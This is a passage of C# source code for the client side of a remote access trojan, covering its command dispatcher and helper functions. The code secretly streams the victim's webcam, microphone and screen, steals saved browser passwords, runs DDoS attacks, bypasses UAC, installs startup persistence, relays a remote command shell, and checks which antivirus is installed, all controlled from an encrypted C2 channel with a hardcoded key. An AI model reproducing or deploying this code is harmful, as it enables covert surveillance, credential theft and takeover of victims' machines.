                // TODO: rework click algorithm, send byte values by default to bypass conversation overhead
                MouseEvent(t[1], t[2]); //Generate a new mouse event
            }
            else if (text == "alist") //List the installed audio input devices
            {
                StringBuilder listing = new StringBuilder();
                listing.Append("alist");

                for (int i = 0; i < NAudio.Wave.WaveIn.DeviceCount; i++) //Loop through the devices
                {
                    // Get the device info
                    NAudio.Wave.WaveInCapabilities c = NAudio.Wave.WaveIn.GetCapabilities(i);
                    // Add the device to the listing
                    listing.Append(c.ProductName).Append("|")
                        .Append(c.Channels.ToString()).Append("§");
                }

                // Get and format the response
                string resp = listing.ToString();
                if (resp.Length > 0) resp = resp.Substring(0, resp.Length - 1);
                SendCommand(resp); //Send response to the server
            }
            else if (text.StartsWith("astream")) //Start streaming audio
            {
                try
                {
                    int deviceNumber = int.Parse(text.Substring(8)); //Convert the number to int
                    NAudio.Wave.WaveInEvent audioSource = new NAudio.Wave.WaveInEvent
                    {
                        DeviceNumber = deviceNumber, //The device ID
                        WaveFormat = new NAudio.Wave.WaveFormat(44100, NAudio.Wave.WaveIn.GetCapabilities(deviceNumber).Channels) //The format of the wave
                    }; //Create a new wave reader
                    audioSource.DataAvailable += new EventHandler<NAudio.Wave.WaveInEventArgs>(SendAudio); //Attach to new audio event
                    streaming = audioSource; //Set the global audio source
                    audioSource.StartRecording(); //Start receiving data from mic
                }
                catch (Exception) //Wrong device ID
                {
                    ReportError(ErrorType.DEVICE_NOT_AVAILABLE, "Can't stream microphone!", "Selected Device is not available!"); //Report error to the server
                }
            }
            else if (text == "astop") //Stop streaming audio
            {
                streaming.StopRecording(); //Stop receiving audio from the mic
                streaming.Dispose(); //Dispose the audio input
                streaming = null;
            }
            else if (text == "wlist") //List the camera devices
            {
                FilterInfoCollection devices = new FilterInfoCollection(FilterCategory.VideoInputDevice); //Get the video input devices on this machine
                int i = 0; //Count of the devices
                StringBuilder listing = new StringBuilder();
                listing.Append("wlist"); // Add response header

                foreach (FilterInfo device in devices) //Go through the devices
                {
                    // Append the device ID and the name of the device
                    listing.Append(i.ToString()).Append("|")
                        .Append(device.Name).Append("§");
                    i++; //Increment the ID
                }

                // Get and format the listing
                string resp = listing.ToString();
                if (resp.Length > 0) resp = resp.Substring(0, resp.Length - 1); //remove the split char ('§') from the end
                SendCommand(resp); //Send response to the server
            }
            else if (text.StartsWith("wstream")) //Stream camera
            {
                int id = int.Parse(text.Substring(8)); //The ID of the device to stream the image of

                FilterInfoCollection devices = new FilterInfoCollection(FilterCategory.VideoInputDevice); //Get all video input devices
                if (devices.Count == 0) //No devices
                {
                    ReportError(ErrorType.DEVICE_NOT_AVAILABLE, "Can't stream webcam!", "The selected device is not found!"); //Report error to the server
                    return;
                }
                int i = 0;
                FilterInfo dName = new FilterInfo(""); //Create a new empty device

                foreach (FilterInfo device in devices) //Loop through the video devices
                {
                    if (i == id) //If the IDs match
                    {
                        dName = device; //Set the device
                        break;
                    }
                    i++; //Increment the ID
                }

                //Console.WriteLine(dName.Name);

                source = new VideoCaptureDevice(dName.MonikerString); //Get the capture device
                source.NewFrame += new NewFrameEventHandler(Source_NewFrame); //Attach a new image handler
                source.Start(); //Start receiving images from the camera
            }
            else if (text == "wstop") //Stop the camera stream
            {
                source.Stop(); //Stop receiving images from the camera
                source = null;
            }
            else if (text.StartsWith("ddosr")) //Start a new DDoS attack
            {
                string[] data = text.Split('|'); //Get the command parts
                string ip = data[1]; //Get the IP of the remote machine
                string port = data[2]; //Get the port to attack on
                string protocol = data[3]; //Get the protocol to use
                string packetSize = data[4]; //Get the packet size to send
                string threads = data[5]; //Get the threads to attack with
                string delay = data[6]; //Get the delay between packet sends

                DDoS = new DDoS(ip, port, protocol, packetSize, threads, delay); //Create a new DDoS module
                DDoS.StartDdos(); //Start the attack
            }
            else if (text.StartsWith("ddosk")) //Kill the DDoS attack
            {
                if (DDoS != null) DDoS.StopDDoS(); //Stop attacking
            }
            else if (text == "getpw") //Get the passwords of major installed browsers
            {
                if (File.Exists(Application.StartupPath + "\\ff.exe")) //If PF is present
                {
                    PasswordManager pm = new PasswordManager(); //Create a new password manager module
                    string[] passwd = pm.GetSavedPassword(); //Get the saved passwords
                    string gcpw = "gcpw\n" + passwd[0]; //Get Google Chrome Passwords
                    string iepw = "iepw\n" + passwd[1]; //Get Internet Explorer Passwords
                    string ffpw = "ffpw\n" + passwd[2]; //Get Firefox passwords
                    SendCommand(iepw); //Send IE passwords
                    //Console.WriteLine("iepw sent");
                    Thread.Sleep(1000);
                    SendCommand(gcpw); //Send GC passwords
                    //Console.WriteLine("gcpw sent");
                    Thread.Sleep(1000);
                    SendCommand(ffpw); //Send FF passwords
                    //Console.WriteLine("ffpw sent");
                    //Dispose the passwords
                    pm = null;
                    gcpw = null;
                    iepw = null;
                    ffpw = null;
                }
                else //PF isn't present
                {
                    SendCommand("getpwu"); //Send back empty results
                    ReportError(ErrorType.PASSWORD_RECOVERY_FAILED, "Can't recover passwords!", "ff.exe (PasswordFox) is missing!"); //Report error to the server
                }
            }
            else if (text == "getstart") //Get the startup folder of the client
            {
                SendCommand("setstart§" + Application.StartupPath); //Send it to the server
            }
#if EnableAutoBypass
            else if (text == "uacload") //Auto download the UAC bypassing toolkit
            {
                UAC uac = new UAC(); //Create a new UAC module
                foreach (int progress in uac.AutoLoadBypass()) //Update the progress of the download
                {
                    SendCommand("uacload§" + progress.ToString()); //Send the progress to the server
                }
            }
#endif
            else if (text == "uacbypass") //Bypass the UAC
            {
                UAC uac = new UAC(); //Create a new UAC module
                if (uac.IsAdmin()) //Check if we run as elevated
                {
                    SendCommand("uac§a_admin"); //Notify the Server and don't re-bypass
                    return;
                }

                try
                {
                    if (uac.BypassUAC()) SendCommand("uac§s_admin"); //UAC bypassed!! :)
                    else SendCommand("uac§f_admin"); //Failed to bypass UAC :(
                }
                catch (Exception) //Something went wrong
                {
                    uac.ProbeStart(UAC.ProbeMethod.StartUpFolder); //Fallback to probing the statup folder
                }
            }
            else if (text.StartsWith("writeipc§")) //Write to a process with remote IPC
            {
                string idAndMessage = text.Substring(text.IndexOf('§') + 1); //Get command parameters
                string message = idAndMessage.Substring(idAndMessage.IndexOf('§') + 1); //Get the message to send
                _ipcClient.WriteStream(message); //Sen the message to the IPC server
            }
            else if (text.StartsWith("startipc§")) //Start a new IPC connection
            {
                string servername = text.Substring(text.IndexOf('§') + 1); //The server to start
                StartIPCHandler(); //Start the handler
                LaunchIPCChild(servername); //Launch the child process
            }
            else if (text.StartsWith("stopipc§")) //Stop IPC connections
            {
                StopIPCHandler(); //Disconnect from the IPC server
            }
            else if (text == "countScreens") //Get the available screens on the machine
            {
                // TODO: look into sending one message for all of the monitors
                foreach (Screen screen in Screen.AllScreens) //Loop through screens
                {
                    getScreens = screen.DeviceName.Replace("\\\\.\\DISPLAY", ""); //Get the ID of the screen

                    SendCommand("ScreenCount" + getScreens); //Send the screen ID to the server
                }
            }
            else if (text.StartsWith("screenNum")) //Set the screen ID to view during the remote desktop session
            {
                ScreenNumber = int.Parse(text.Substring(9)) - 1; //because the screens start at 0 not 1 
                //Console.WriteLine(ScreenNumber.ToString());
            }
            else if (text.StartsWith("sprobe§")) //Probe startup options
            {
                string method = text.Substring(7); //Get the probing method
                UAC.ProbeMethod pm = UAC.ProbeMethod.StartUpFolder; //Declare a probing method

                //Parse the method to use
                if (method == "Registry") pm = UAC.ProbeMethod.Registry;
                else if (method == "Task Scheduler") pm = UAC.ProbeMethod.TaskScheduler;
                else if (method == "Startup Folder") pm = UAC.ProbeMethod.StartUpFolder;
                else return;

                UAC uac = new UAC(); //Create a new UAC module
                uac.ProbeStart(pm); //Probe the startup using the selected method
            }
        }

        /// <summary>
        /// Paste the file or directory to the target directory
        /// </summary>
        /// <param name="source">The source file/directory to paste</param>
        /// <param name="target">The target directory to receive the source</param>
        /// <param name="mode">Move or Copy</param>
        /// <param name="sourceType">File or Directory</param>
        private static void PasteFileOrDir(string source, string target, string mode, string sourceType)
        {
            switch (sourceType) //Check the sourceType
            {
                case "dir": //Source is a folder
                    if (mode == "1")
                    {
                        //Copy Directory
                        string name = new DirectoryInfo(source).Name;
                        Directory.CreateDirectory(target + "\\" + name);
                        DirectoryCopy(source, target + "\\" + name, true);
                    }
                    else if (mode == "2")
                    {
                        //Move Directory
                        string name = new DirectoryInfo(source).Name;
                        Directory.CreateDirectory(target + "\\" + name);
                        DirectoryMove(source, target + "\\" + name, true);
                    }
                    break;
                case "file": //Source is a file
                    if (mode == "1")
                    {
                        //Copy File
                        File.Copy(source, target + "\\" + new FileInfo(source).Name, true);
                    }
                    else if (mode == "2")
                    {
                        //Move File
                        File.Move(source, target + "\\" + new FileInfo(source).Name);
                    }
                    break;
            }
        }

        /// <summary>
        /// Get the list of files and directories in a directory
        /// </summary>
        /// <param name="path">The path of the directory to list</param>
        /// <returns>A response to send to the server</returns>
        private static string GetFilesList(string path)
        {
            string[] directories = Directory.GetDirectories(path); //Get the sub folders
            string[] files = Directory.GetFiles(path); //Get the sub files
            StringBuilder listing = new StringBuilder(); // Create string builder for response
            listing.Append("fdirl");

            for (int i = 0; i < directories.Length; i++)
            {
                string d = directories[i]; // Get the current directory
                listing.Append(d.Replace(path, string.Empty)).Append("§") // Get the name of the directory
                    .Append("N/A").Append("§") // Get the size of the directory
                    .Append(Directory.GetCreationTime(d).ToString()).Append("§") // Get the creation time of the directory
                    .Append(d).Append("\n"); // Get the full path of the directory
            }

            for (int i = 0; i < files.Length; i++)
            {
                string f = files[i]; // Get the current file
                FileInfo finfo = new FileInfo(f); // Get the info of the current file
                listing.Append(finfo.Name).Append("§") // Get the name of the file
                    .Append(finfo.Length.ToString()).Append("§") // Get the size of the file in bytes
                    .Append(finfo.CreationTime.ToString()).Append("§") // Get the creation time of the file
                    .Append(f).Append("\n"); // Get the full path of the file
            }

            return listing.ToString();
        }

        /// <summary>
        /// Show or Hide one of the pre-configured desktop elements
        /// </summary>
        /// <param name="action">Hide or Show</param>
        /// <param name="element">The name of the element</param>
        private static void ShowHideElement(string action, string element)
        {
            //Determine the element and show/hide it
            switch (element)
            {
                case "task":

                    if (action == "hide")
                    {
                        HTaskBar();
                    }
                    else
                    {
                        STaskBar();
                    }

                    break;

                case "clock":

                    if (action == "hide")
                    {
                        HClock();
                    }
                    else
                    {
                        SClock();
                    }

                    break;

                case "tray":

                    if (action == "hide")
                    {
                        HTrayIcons();
                    }
                    else
                    {
                        STrayIcons();
                    }

                    break;

                case "desktop":

                    if (action == "hide")
                    {
                        HDesktop();
                    }
                    else
                    {
                        SDesktop();
                    }

                    break;

                case "start":

                    if (action == "hide")
                    {
                        HStart();
                    }
                    else
                    {
                        SStart();
                    }

                    break;
            }
        }

        /// <summary>
        /// Play a system sound
        /// </summary>
        /// <param name="snd">The system sound to play</param>
        private static void PlaySystemSound(string snd)
        {
            System.Media.SystemSound sound; //Create a sound var

            //Parse the ID to actual sound object
            switch (snd)
            {
                case "0":
                    sound = System.Media.SystemSounds.Beep;
                    break;

                case "1":
                    sound = System.Media.SystemSounds.Hand;
                    break;

                case "2":
                    sound = System.Media.SystemSounds.Exclamation;
                    break;

                default:
                    sound = System.Media.SystemSounds.Asterisk;
                    break;
            }

            sound.Play(); //Play the system sound
        }

        /// <summary>
        /// Read data from the server
        /// </summary>
        private static void ReceiveResponse()
        {

            byte[] buffer = new byte[2048]; //The receive buffer

            try
            {
                int received = 0;
                if (!IsLinuxServer) received = _clientSocket.Receive(buffer, SocketFlags.None); //Receive data from the server
                else received = _sslClient.Read(buffer, 0, 2048);
                if (received == 0) return; //If failed to received data return
                byte[] data = new byte[received]; //Create a new buffer with the exact data size
                Array.Copy(buffer, data, received); //Copy from the receive to the exact size buffer

                if (isFileDownload) //File download is in progress
                {
                    Buffer.BlockCopy(data, 0, recvFile, writeSize, data.Length); //Copy the file data to memory

                    writeSize += data.Length; //Increment the received file size

                    if (writeSize == fup_size) //prev. recvFile.Length == fup_size
                    {
                        //Console.WriteLine("Create File " + recvFile.Length);

                        using (FileStream fs = File.Create(fup_location))
                        {
                            byte[] info = recvFile;
                            // Add some information to the file.
                            fs.Write(info, 0, info.Length);
                        }

                        Array.Clear(recvFile, 0, recvFile.Length);
                        SendCommand("frecv");
                        writeSize = 0;
                        isFileDownload = false;
                    }
                }
                else //Not downloading files
                {
                    string text = encoder.GetString(data); //Convert the data to unicode string
                    string[] commands = GetCommands(text); //Get command of the message

                    //Console.WriteLine(text);

                    foreach (string cmd in commands) //Loop through the commands
                    {
                        if (!IsLinuxServer) HandleCommand(Decrypt(cmd)); //Decrypt and execute the command
                        else HandleCommand(cmd);
                    }
                }
            }
            catch (Exception ex) //Somethind went wrong
            {
                //Console.WriteLine(ex.Message);
                RDesktop.isShutdown = true; //Stop streaming remote desktop
                Console.WriteLine("Connection ended");
            }
        }

        /// <summary>
        /// Handle camera imagage frames
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">Frame Event Arguments</param>
        private static void Source_NewFrame(object sender, NewFrameEventArgs e)
        {
            try
            {
                Bitmap cam = (Bitmap)e.Frame.Clone(); //Get the frame of the camera

                ImageConverter convert = new ImageConverter(); //Create a new image converter
                byte[] camBuffer = (byte[])convert.ConvertTo(cam, typeof(byte[])); //Convert the image to bytes
                byte[] send = new byte[camBuffer.Length + 16]; //Create a new buffer for the command
                byte[] header = encoder.GetBytes("wcstream"); //Get the bytes of the header
                // TODO: look into block copy vs array copy
                Buffer.BlockCopy(header, 0, send, 0, header.Length); //Copy the header to the main buffer
                Buffer.BlockCopy(camBuffer, 0, send, header.Length, camBuffer.Length); //Copy the image to the main buffer
                //Console.WriteLine("Size of send: " + send.Length);
                _clientSocket.Send(send, 0, send.Length, SocketFlags.None); //Send the frame to the server
                //Wait for send and dispose the image
                Application.DoEvents();
                Thread.Sleep(200);
                cam.Dispose();
            }
            catch (Exception) //Something went wrong
            {
                try
                {
                    Console.WriteLine("Connection Ended");
                    Thread.Sleep(3000);
                    isDisconnect = true; //Disconnect from the server
                }
                catch (Exception exc) //Something went really wrong
                {
                    //Restart the whole application
                    Console.WriteLine("Failed to send New Frame  original ERROR : " + exc.Message);
                    Thread.Sleep(10000);
                    Application.Restart();
                    return;
                }
            }
        }

        /// <summary>
        /// Handle audio data from microphone
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The Audio event arguments</param>
        private static void SendAudio(object sender, NAudio.Wave.WaveInEventArgs e)
        {
            byte[] rawAudio = e.Buffer; //Get the buffer of the audio
            //Console.WriteLine("Size of the audio: " + rawAudio.Length);
            byte[] send = new byte[rawAudio.Length + 16]; //Create a new buffer to send to the server
            byte[] header = Encoding.Unicode.GetBytes("austream"); //Get the bytes of the header
            // TODO: look into array copy vs block copy
            Buffer.BlockCopy(header, 0, send, 0, header.Length); //Copy the header to the main buffer
            Buffer.BlockCopy(rawAudio, 0, send, header.Length, rawAudio.Length); //Copy the audio data to the main buffer
            //Console.WriteLine("Size of send: " + send.Length);
            _clientSocket.Send(send, 0, send.Length, SocketFlags.None); //Send audio data to the server
        }

        /// <summary>
        /// Send desktop screen to the server
        /// </summary>
        /// <param name="img">The image to send as bytes</param>
        public static void SendScreen(byte[] img)
        {
            try
            {
                //Console.WriteLine("Size of the image: " + img.Length);
                byte[] send = new byte[img.Length + 16]; //Create a new buffer to send to the server
                byte[] header = Encoding.Unicode.GetBytes("rdstream"); //Get the bytes of the header
                // TODO: look into block copy vs array copy
                Buffer.BlockCopy(header, 0, send, 0, header.Length); //Copy the header to the main buffer
                Buffer.BlockCopy(img, 0, send, header.Length, img.Length); //Copy the image to the main buffer
                //Console.WriteLine("Size of send: " + send.Length);
                _clientSocket.Send(send, 0, send.Length, SocketFlags.None); //Send the image to the server
            }
            catch (Exception) //Something went wrong
            {
                try
                {
                    Console.WriteLine("Connection Ended");
                    Thread.Sleep(3000);
                    isDisconnect = true; //Disconnect from server
                }
                catch (Exception exc) //Something went really wrong
                {
                    //Restart the application
                    Console.WriteLine("Failed to send Screen  original ERROR : " + exc.Message);
                    Thread.Sleep(10000);
                    Application.Restart();
                    return;
                }
            }
        }

        /// <summary>
        /// Handle a mouse click event from the server
        /// </summary>
        /// <param name="button">The button to manipulate</param>
        /// <param name="direction">Press down or release action</param>
        private static void MouseEvent(string button, string direction)
        {
            //Get the current position of the mouse
            int X = Cursor.Position.X;
            int Y = Cursor.Position.Y;

            //Check and handle button press or release
            switch (button)
            {
                case "left":
                    if (direction == "up")
                    {
                        Mouse_eventLeftUP(MouseEventFlags.LEFTUP, X, Y, 0, 0);
                        //Console.WriteLine("mouseevent leftup");
                    }

                    else
                    {
                        Mouse_eventLeftDown(MouseEventFlags.LEFTDOWN, X, Y, 0, 0);
                        //Console.WriteLine("mouseevent leftdown");
                    }

                    break;

                case "right":
                    if (direction == "up")
                    {
                        Mouse_eventRightUP(MouseEventFlags.RIGHTUP, X, Y, 0, 0);
                        //Console.WriteLine("mouseevent rightup");
                    }

                    else
                    {
                        mouse_eventRightDown(MouseEventFlags.RIGHTDOWN, X, Y, 0, 0);
                        //Console.WriteLine("mouseevent rightdown");
                    }

                    break;
            }
        }

        /// <summary>
        /// Release the left
        /// </summary>
        /// <param name="lEFTUP">Mouse event code</param>
        /// <param name="x">The mouse X position on the screen</param>
        /// <param name="y">The mouse Y position on the screen</param>
        /// <param name="v1"></param>
        /// <param name="v2"></param>
        private static void Mouse_eventLeftUP(MouseEventFlags lEFTUP, int x, int y, int v1, int v2)
        {
            Cursor.Position = new Point(x, y);
            mouse_event((int)(MouseEventFlags.LEFTUP), x, y, v1, v2);
        }

        /// <summary>
        /// Press down the left mouse button
        /// </summary>
        /// <param name="lEFTUP">Mouse event code</param>
        /// <param name="x">The mouse X position on the screen</param>
        /// <param name="y">The mouse Y position on the screen</param>
        /// <param name="v1"></param>
        /// <param name="v2"></param>
        private static void Mouse_eventLeftDown(MouseEventFlags lEFTUP, int x, int y, int v1, int v2)
        {
            Cursor.Position = new Point(x, y);
            mouse_event((int)(MouseEventFlags.LEFTDOWN), x, y, v1, v2);
        }

        /// <summary>
        /// Release the right mouse button
        /// </summary>
        /// <param name="lEFTUP">Mouse event code</param>
        /// <param name="x">The mouse X position on the screen</param>
        /// <param name="y">The mouse Y position on the screen</param>
        /// <param name="v1"></param>
        /// <param name="v2"></param>
        private static void Mouse_eventRightUP(MouseEventFlags lEFTUP, int x, int y, int v1, int v2)
        {
            Cursor.Position = new Point(x, y);
            mouse_event((int)(MouseEventFlags.RIGHTUP), x, y, v1, v2);
        }

        /// <summary>
        /// Press down the right mouse button
        /// </summary>
        /// <param name="lEFTUP">Mouse event code</param>
        /// <param name="x">The mouse X position on the screen</param>
        /// <param name="y">The mouse Y position on the screen</param>
        /// <param name="v1"></param>
        /// <param name="v2"></param>
        private static void mouse_eventRightDown(MouseEventFlags lEFTUP, int x, int y, int v1, int v2)
        {
            Cursor.Position = new Point(x, y);
            mouse_event((int)(MouseEventFlags.RIGHTDOWN), x, y, v1, v2);
        }

        /// <summary>
        /// Copy a directory
        /// </summary>
        /// <param name="sourceDirName">The directory to copy</param>
        /// <param name="destDirName">The directory to copy to</param>
        /// <param name="copySubDirs">True if recursive, otherwise false</param>
        private static void DirectoryCopy(string sourceDirName, string destDirName, bool copySubDirs)
        {
            // Get the subdirectories for the specified directory.
            DirectoryInfo dir = new DirectoryInfo(sourceDirName);
            DirectoryInfo[] dirs = dir.GetDirectories();

            if (!dir.Exists)
            {
                throw new DirectoryNotFoundException(
                    "Source directory does not exist or could not be found: "
                    + sourceDirName);
            }

            // If the destination directory doesn't exist, create it. 
            if (!Directory.Exists(destDirName))
            {
                Directory.CreateDirectory(destDirName);
            }

            // Get the files in the directory and copy them to the new location.
            FileInfo[] files = dir.GetFiles();
            foreach (FileInfo file in files)
            {
                string temppath = Path.Combine(destDirName, file.Name);
                file.CopyTo(temppath, false);
            }

            // If copying subdirectories, copy them and their contents to new location. 
            if (copySubDirs)
            {
                foreach (DirectoryInfo subdir in dirs)
                {
                    string temppath = Path.Combine(destDirName, subdir.Name);
                    DirectoryCopy(subdir.FullName, temppath, copySubDirs);
                }
            }
        }

        /// <summary>
        /// Move directory
        /// </summary>
        /// <param name="sourceDirName">The directory to copy</param>
        /// <param name="destDirName">The directory to copy to</param>
        /// <param name="copySubDirs">True if recursive, otherwise false</param>
        private static void DirectoryMove(string sourceDirName, string destDirName, bool copySubDirs)
        {
            // Get the subdirectories for the specified directory.
            DirectoryInfo dir = new DirectoryInfo(sourceDirName);
            DirectoryInfo[] dirs = dir.GetDirectories();

            if (!dir.Exists)
            {
                throw new DirectoryNotFoundException(
                    "Source directory does not exist or could not be found: "
                    + sourceDirName);
            }

            // If the destination directory doesn't exist, create it. 
            if (!Directory.Exists(destDirName))
            {
                Directory.CreateDirectory(destDirName);
            }

            // Get the files in the directory and copy them to the new location.
            FileInfo[] files = dir.GetFiles();
            foreach (FileInfo file in files)
            {
                string temppath = Path.Combine(destDirName, file.Name);
                file.MoveTo(temppath);
            }

            // If copying subdirectories, copy them and their contents to new location. 
            if (copySubDirs)
            {
                foreach (DirectoryInfo subdir in dirs)
                {
                    string temppath = Path.Combine(destDirName, subdir.Name);
                    DirectoryMove(subdir.FullName, temppath, copySubDirs);
                }
            }

            else
            {

            }
        }

        /// <summary>
        /// Read output from the remote cmd module
        /// </summary>
        private static void GetShellOutput()
        {
            Task.Factory.StartNew(() =>
            {
                try
                {
                    string outputBuffer = "";

                    while ((outputBuffer = fromShell.ReadLine()) != null)
                    {
                        SendCommand("cmdout§" + outputBuffer);
                    }
                }
                catch (Exception ex)
                {
                    SendCommand("cmdout§Error reading cmd response: \n" + ex.Message); //Send message to remote cmd window
                    ReportError(ErrorType.CMD_STREAM_READ, "Can't read stream!", "Remote Cmd stream reading failed!"); //Report error to the server
                }
            });

            Task.Factory.StartNew(() =>
            {
                try
                {
                    string errorBuffer = "";

                    while ((errorBuffer = error.ReadLine()) != null)
                    {
                        SendCommand("cmdout§" + errorBuffer);
                    }
                }
                catch (Exception ex)
                {
                    SendCommand("cmdout§Error reading cmd response: \n" + ex.Message); //Send message to remote cmd window
                    ReportError(ErrorType.CMD_STREAM_READ, "Can't read stream!", "Remote Cmd stream reading failed!"); //Report error to the server
                }
            });

        }

        /// <summary>
        /// Hide the clock
        /// </summary>
        public static void HClock()
        {
            int hwnd = 0;
            ShowWindow(
              FindWindowEx(FindWindowEx(FindWindow("Shell_TrayWnd", null), hwnd, "TrayNotifyWnd", null),
              hwnd, "TrayClockWClass", null),
              SW_HIDE);
        }

        /// <summary>
        /// Show the clock
        /// </summary>
        public static void SClock()
        {
            int hwnd = 0;
            ShowWindow(
              FindWindowEx(FindWindowEx(FindWindow("Shell_TrayWnd", null), hwnd, "TrayNotifyWnd", null),
              hwnd, "TrayClockWClass", null),
              SW_SHOW);
        }

        /// <summary>
        /// Hide the task bar
        /// </summary>
        public static void HTaskBar()
        {
            ShowWindow(FindWindow("Shell_TrayWnd", null), SW_HIDE);
        }

        /// <summary>
        /// Show the task bar
        /// </summary>
        public static void STaskBar()
        {
            ShowWindow(FindWindow("Shell_TrayWnd", null), SW_SHOW);
        }

        /// <summary>
        /// Hide desktop icons
        /// </summary>
        public static void HDesktop()
        {
            ShowWindow(FindWindow(null, "Program Manager"), SW_HIDE);
        }

        /// <summary>
        /// Show desktop icons
        /// </summary>
        public static void SDesktop()
        {
            ShowWindow(FindWindow(null, "Program Manager"), SW_SHOW);
        }

        /// <summary>
        /// Hide tray icons
        /// </summary>
        public static void HTrayIcons()
        {
            int hwnd = 0;
            ShowWindow(FindWindowEx(FindWindow("Shell_TrayWnd", null),
                            hwnd, "TrayNotifyWnd", null),
                            SW_HIDE);
        }

        /// <summary>
        /// Show tray icons
        /// </summary>
        public static void STrayIcons()
        {
            int hwnd = 0;
            ShowWindow(FindWindowEx(FindWindow("Shell_TrayWnd", null),
                            hwnd, "TrayNotifyWnd", null),
                            SW_SHOW);
        }

        /// <summary>
        /// Hide start button (Only on XP)
        /// </summary>
        public static void HStart()
        {
            ShowWindow(FindWindow("Button", null), SW_HIDE);
        }

        /// <summary>
        /// Show start button
        /// </summary>
        public static void SStart()
        {
            ShowWindow(FindWindow("Button", null), SW_SHOW);
        }

        /// <summary>
        /// Text to speech
        /// </summary>
        /// <param name="stext">The text to read out</param>
        private static void T2S(string stext)
        {
            using (System.Speech.Synthesis.SpeechSynthesizer speech = new System.Speech.Synthesis.SpeechSynthesizer()) //Create a new text reader
            {
                speech.SetOutputToDefaultAudioDevice(); //Set the output device
                speech.Speak(stext); //Read the text
            }
        }

        /// <summary>
        /// Play a frequency
        /// </summary>
        /// <param name="freq">The frequncy to play</param>
        /// <param name="duration">The duration of the frequency to play</param>
        private static void GenerateFreq(int freq, int duration)
        {
            Console.Beep(freq, duration * 1000); //Play the frequency
        }

        /// <summary>
        /// Create and display a message box
        /// </summary>
        /// <param name="info">The string info sent by the server</param>
        private static void CreateMessage(String[] info)
        {
            string title = info[1]; //Get the title
            string text = info[2]; //Get the prompt text
            string icon = info[3]; //Get the icon
            string button = info[4]; //Get the buttons
            MessageBoxIcon ico;// = MessageBoxIcon.None;
            MessageBoxButtons btn;// = MessageBoxButtons.OK;

            //Parse the icon and buttons data

            switch (icon)
            {
                case "1":
                    ico = MessageBoxIcon.Error;
                    break;

                case "2":
                    ico = MessageBoxIcon.Warning;
                    break;

                case "3":
                    ico = MessageBoxIcon.Information;
                    break;

                case "4":
                    ico = MessageBoxIcon.Question;
                    break;

                default:
                    ico = MessageBoxIcon.None;
                    break;
            }

            switch (button)
            {
                case "1":
                    btn = MessageBoxButtons.YesNo;
                    break;

                case "2":
                    btn = MessageBoxButtons.YesNoCancel;
                    break;

                case "3":
                    btn = MessageBoxButtons.AbortRetryIgnore;
                    break;

                case "4":
                    btn = MessageBoxButtons.OKCancel;
                    break;
                default:
                    btn = MessageBoxButtons.OK;
                    break;
            }

            // TODO: move to new thread
            MessageBox.Show(text, title, btn, ico); //Display the message box
        }

        /// <summary>
        /// Get the IPv4 address of the local machine
        /// </summary>
        /// <returns>The IPv4 address of the machine</returns>
        public static string GetLocalIPAddress()
        {
            if (LocalIPCache != string.Empty) return LocalIPCache;
            IPHostEntry host = Dns.GetHostEntry(Dns.GetHostName()); //Get our ip addresses
            foreach (IPAddress ip in host.AddressList) //Go through the addresses
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork) //If address is inet
                {
                    LocalIPCache = ip.ToString();
                    return ip.ToString(); //Return the ip of the machine
                }
            }
            return "N/A"; //IP not found at this point
        }

        /// <summary>
        /// Get the Anti-Virus product name of the machine
        /// </summary>
        /// <returns>The name of the installed AV product</returns>
        public static string AvName()
        {
            if (LocalAVCache != string.Empty) return LocalAVCache;
            string wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter2"; //Create the WMI path
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct"); //Create a search query
            ManagementObjectCollection instances = searcher.Get(); //Search the database
            string av = ""; //The name of the AV product
            foreach (ManagementBaseObject instance in instances) //Go through the results
            {
                //Console.WriteLine(instance.GetPropertyValue("displayName"));
                av = instance.GetPropertyValue("displayName").ToString(); //Get the name of the AV
            }

            if (av == "") av = "N/A"; //If AV name isn't found return this

            LocalAVCache = av;

            return av; //Return the name of the installed AV Product
        }

        /// <summary>
        /// Encrypt data
        /// </summary>
        /// <param name="clearText">The message to encrypt</param>
        /// <returns>The encrypted Base64 CipherText</returns>
        public static string Encrypt(string clearText)
        {
            try
            {
                string EncryptionKey = "MAKV2SPBNI99212"; //Encryption key
                byte[] clearBytes = Encoding.Unicode.GetBytes(clearText); //Bytes of the message
                using (Aes encryptor = Aes.Create()) //Create a new AES decryptor
                {
                    //Encrypt the data
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);

                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(clearBytes, 0, clearBytes.Length);
                            cs.Close();
                        }
                        clearText = Convert.ToBase64String(ms.ToArray());
                    }
                }
                return clearText; //Return the encrypted text
            }
            catch (Exception) //Something went wrong
            {
                ReportError(ErrorType.ENCRYPT_DATA_CORRUPTED, "Can't encrypt message!", "Message encryption failed!"); //Report error to server
                return clearText; //Send the plain text data
            }
        }

        /// <summary>
        /// Decrypt encrypted data
        /// </summary>
        /// <param name="cipherText">The data to decrypt</param>
        /// <returns>The plain text message</returns>
        public static string Decrypt(string cipherText)
        {
            try
            {
                string EncryptionKey = "MAKV2SPBNI99212"; //this is the secret encryption key  you want to hide dont show it to other guys
                byte[] cipherBytes = Convert.FromBase64String(cipherText); //Get the encrypted message's bytes
                using (Aes encryptor = Aes.Create()) //Create a new AES object
                {
                    //Decrypt the text
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(cipherBytes, 0, cipherBytes.Length);
                            cs.Close();
                        }
